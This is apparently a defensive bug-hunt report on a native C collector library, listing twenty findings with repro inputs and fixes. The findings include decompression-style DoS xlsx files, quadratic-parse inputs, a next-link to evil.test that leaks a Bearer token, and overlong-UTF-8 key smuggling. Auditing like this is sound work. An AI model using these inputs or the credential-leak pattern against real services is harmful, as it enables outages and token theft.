# Bug hunt: native/lib + sampled collectors (read-only; harnesses in scratchpad/libfuzz/)
Legend: REPRO = reproduced with a harness here; REASONED = from code only. Harnesses: libfuzz/{mk.py,xh.c,tq.c,rh.c,jn.c,hh.c,cj.c}.
Random-mutation ASAN/UBSan fuzz (200k htmlparse/csv/zip/xlsx iterations + 300k mutated-xlsx) found NO memory-safety crash; zipread/xlsx/csv/htmlparse/seenset/bloom/datetok are bounds-clean. The findings are DoS amplification, cross-host credential leak and logic errors.

## LIB-01 HIGH  xlsx: shared-string reuse bypasses JO_XLSX_MAX_CELLS -> multi-GB output  [REPRO]
lib/xlsx.c walk_sheet() pass 2 (`xb_put(&cell, shared[idx]...)`, `csv_put_cell`) + max_cells(). The ceiling counts cells (2M) not bytes. 
Input: 1,898-byte .xlsx: one 1 MB <si>, sheet with 3,000 `<c t="s"><v>0</v></c>`. Result: rc=0, csv_len=3,000,003,000 (3 GB) in 3 s; 2M cells => 2 TB => OOM-kill of the whole server. zipread's 256 MB cap only bounds each part, not the product.
Fix: cap total output bytes (e.g. JO_XLSX_MAX_BYTES) in pass 1 by summing strlen(shared[idx]) per referencing cell; refuse like the cell ceiling does. Confidence: certain.

## LIB-02 HIGH  html_table_parse: O(n^2) on repeated <table> with a `must` that misses  [REPRO]
lib/htmlparse.c html_table_parse(): `for each '<' ... ht_open_at(p,"table") -> ht_table_end(p)` (scans to doc end when tables are unclosed/nested) plus a naive memcmp `must` scan per table.
Input: N x "<table>" with must="zzz": 140 KB 3.4 s, 280 KB 14 s, 560 KB 60 s (-O2). 5 MB body ~ 1.5 h of one collector thread. Also via hpengine HP_HTML table_must (nested 8000 deep = 10 s ASAN).
Fix: single pass computing matching ends with a stack, or bound nesting/ number of candidate tables; memmem for must; cache ht_table_end results. Confidence: certain.

## LIB-03 MEDIUM-HIGH  Next-link / detail "{v}" URLs followed cross-host with the row's auth headers  [REPRO via hpengine stub harness hh.c]
lib/hpengine.c:5443-5455 (`nextp = st.next_url`, no host check; only a stored *resume* position is host-checked at :4980) and hp_deepen() :1474-1480 (`whole` URL taken from record field when detail_url starts "{v}"). 
Repro: row with headers={"Authorization: Bearer SECRET"}; page 1 returns {"next":"http://evil.test/steal"} => request 2 goes to evil.test WITH the Authorization header (last_url=http://evil.test/steal, hdrs contain SECRET). Same for detail_key value "http://evil.test/x". Likely same in jsonlist_next_page()/pagewalk.c (no host logic there: grep -i host finds none) - REASONED. SSRF to private ranges is blocked in httpclient, public attacker host is not; key_env/API tokens are leaked.
Also: relative next links ("/api?page=2") are not resolved against the page URL -> request fails -> walk silently ends as "failed page".
Fix: resolve relative, and require same registrable host (or drop row headers/key query params) for any upstream-supplied URL. hp_host_of (:226) also mis-parses `http://evil/x?e=a@good.com` (takes text after the first '@' anywhere) - weakens the resume-host check.

## LIB-04 MEDIUM  csv_decode_sjis() decodes as SHIFT_JIS, not CP932 -> whole body returned undecoded on common characters  [REPRO via iconv equivalence]
lib/csv.c csv_decode_sjis -> iconv "SHIFT_JIS". glibc's SHIFT_JIS rejects NEC/IBM extensions: `printf '㈱髙橋,①' | iconv -t CP932 | iconv -f SHIFT_JIS` => "illegal input sequence at position 0". csv_decode_charset then fails closed and returns the raw bytes (the whole file), i.e. total mojibake for any Japanese company register containing ㈱ ① 髙 﨑 etc. hpengine.c:729 already knows ("CP932, not SHIFT_JIS") but the other callers do not: rss_atom.c:403, feedlib.c:81/106/157/184, npa_special_fraud.c, npa_missing_persons.c, npa_traffic_accidents.c, gov_money.c, chan_5ch.c.
Related: csv_decode_charset treats EINVAL (one truncated trailing byte) as total failure -> verbatim copy; and the "not UTF-8" trigger (csv_is_utf8) flips on a single stray byte, after which a mostly-UTF-8 body can "successfully" decode as garbage SJIS.
Fix: csv_decode_sjis -> "CP932"; on EINVAL keep converted prefix; use iconv //IGNORE or per-run replacement.

## LIB-05 MEDIUM  RSS/Atom tag_text(): first namespace-agnostic match wins, even self-closing / foreign namespace  [REPRO rh.c]
lib/rss_atom.c tag_text() (matches `<ns:link>`, `<media:description>` as "link"/"description"; returns "" on `<x/>`).
Repro: `<item><atom:link rel="self" href="..."/><title>T</title><link>http://real/1</link>` => link="" (real link never examined; uid falls to title hash). `<media:description>MEDIA</media:description><description>REAL</description>` => desc="MEDIA". Same for `id`, `date`, `author`, `content`.
Fix: prefer unprefixed (or channel-default-ns) element; skip self-closing and keep scanning; only fall back to prefixed.

## LIB-06 MEDIUM  csv_name_rows O(cols^2) (cJSON_GetArrayItem in loops)  [REPRO via hpengine CSV]
lib/csv.c csv_name_rows(): GetArrayItem(head,i)/(row,i) are O(i). Header with 20k/40k/80k columns (160 KB) => 0.4/3.3/17 s (ASAN), quadratic; 1M columns (2 MB) => hours, per data row too. Fix: iterate with ->next pointers. Also duplicate header names produce duplicate JSON keys (second column unreachable): `a,a` loses the 2nd value to lookups (cJSON_GetObjectItem returns first).

## LIB-07 MEDIUM-LOW  xlsx collect_t quadratic  [REPRO]
lib/xlsx.c collect_t(): each iteration calls find_tag(...,"rPh") over the rest of the <si> even when none exists. One <si> with 60,000 `<r><t>a</t></r>` (2.4 KB xlsx) => 70 s CPU; scales n^2 (a 16 MB part => days). Fix: search rPh once / only up to next <t>.

## LIB-08 MEDIUM-LOW  int64 ids as JSON numbers lose precision -> silent uid collision / wrong detail fetch  [REPRO cj.c]
cJSON stores only double. {"id":1234567890123456781} and ...782 both print as 1234567890123456768 via hp_scalar_str (hpengine.c:987, `%lld` of double), hp_deepen (:1466 `%.0f`), jsonlist.c scalar_dup (:149). Distinct snowflake-style ids collapse (rule 4b silent loss) and the detail hop asks for a different id. Fix: parse numbers with raw text (cJSON_Parse with `valuestring`-style raw retention / pre-quote integers >2^53) or key on the original token.

## LIB-09 MEDIUM-LOW  jpnorm_fold: overlong "\xC0\x80" decodes to U+0000 and is written as an embedded NUL  [REPRO jn.c]
lib/jpnorm.c put_cp via utf8.h (documents overlong/surrogates "decoded as written"). `jpnorm_fold("abc\xC0\x80zzz")` => returns n=7 but strlen(out)=3 -> "abc"; any C-string consumer (norm keys, entity merge) truncates, so "abc<hostile>zzz" collides with "abc". Surrogates / >U+10FFFF also emitted as invalid UTF-8 (eda080...). Fix: reject cp==0, overlongs, surrogates, >0x10FFFF in utf8_decode (return U+FFFD / adv=1). csv_is_utf8 and rss_atom is_utf8 have the same acceptance of overlong/surrogates (stored invalid UTF-8).

## LIB-10 LOW-MEDIUM  keyqual occurrences() O(n^2) on repeated base key  [REASONED]
lib/keyqual.c occurrences(): linear count of equal keys on every keyqual_count/keyqual_claim call; a feed repeating one key 200k times => ~4e10 strcmp. Fix: store counts in the sealed array (run-length) or hash map.

## LIB-11 LOW-MEDIUM  Raw-socket collectors: DNS-rebinding TOCTOU past hostgate  [REASONED]
port_scanner.c check_port() (gethostbyname per port, 22x), email_validator.c verify_smtp(), ssl_analyzer.c: hostgate_host_check() resolves with getaddrinfo once, then each connect re-resolves (gethostbyname, not thread-safe either, IPv4 only). An attacker-controlled name (or MX) answering public then 127.0.0.1/10.x defeats the "strict" gate. Fix: resolve once, judge the sockaddr, connect to that address.

## LIB-12 LOW  email_validator: Hunter URL builds `email=%s` unencoded (+ => space, %26 injects params); SMTP loop does one recv() per reply (multi-line 250- EHLO continuation desyncs, RCPT verdict can be read from an EHLO line)  [REASONED]
collectors/sources/email_validator.c ~:195 and verify_smtp. 

## LIB-13 LOW  UB: unguarded (long long)double casts left in hpengine  [REASONED/UBSan-class]
hpengine.c:987 hp_scalar_str and :2526 (numeric next cursor) - the same defect jsonlist.c fixed ("1e308 ... outside range"); "fix the other copies".

## LIB-14 LOW  htmlparse ht_text numeric entities  [REASONED]
htmlparse.c:354 strtoul accepts "-5"/leading blanks; cp>0x10FFFF or negative-wrapped is "ok" but ht_utf8 writes nothing -> entity silently dropped; surrogates written as CESU. Use the checked decoder in hpengine.c hp_xml_decode.

## LIB-15 LOW  rss_collect silent drops  [REASONED]
Items with no guid, link or title (rk NULL) are skipped with no notice (rule 2); rfc822_to_iso accepts ss/mi up to 99 and passes any "dddd-..." string through unvalidated into published_at (TEXT-ordered column).

## LIB-16 LOW  zipread  [REASONED]
inflate_raw allocs min(declared uncomp,256 MB)+1 up front from a 300-byte archive (memory amplification per call; zip_all_entries x 19k members re-walks central directory O(n^2) and can inflate 256 MB each); >65535 entries / ZIP64 silently unreachable (rd16 count, 32-bit sizes); stored entry with uncomp>avail silently returns `avail` bytes; zip_find_eocd does not validate the comment length.

## LIB-17 LOW  datetok  [REASONED]
datetok_render: a format ending in a literal ":NN" (e.g. "%Y-%m-%d %H:%M:00") has ":00" consumed as a day offset and stripped; `amount*10+digit` overflows (UB) for 19+ digits.

## LIB-18 LOW  ws.c  [REASONED]
Fragment reassembly buffer unbounded (until window deadline); uses its own curl handle (no hostgate/SSRF check, no UA policy, no TLS-cause reporting); FOLLOWLOCATION without protocol pin.

## LIB-19 LOW  hp XML: many same-named sibling elements in one record is ~quadratic  [REPRO mild]
hh.c xmlsib: 5k/20k/40k `<name>` siblings => 0.2/2.5/7.5 s (ASAN).

## LIB-20 LOW  academic_world.c author lists silently capped at 20 / 512-1024 bytes (rule 2)  [REASONED]
Bounds themselves are correct (need+NUL checked); it is a silent discard.

## Checked and found clean
zipread bounds (lho/doff/comp clamps), xlsx fuzz, csv_rows/repair (no OOB; PUSH_CHAR break is safe), seenset/bloom, hp_xml_decode (never grows, CDATA bounds), datetok_expand buffers, pagewalk pw_set_num, cam_geocam strcat accounting, deep JSON (cJSON nesting limit) and 1M-deep XML (no stack overflow).
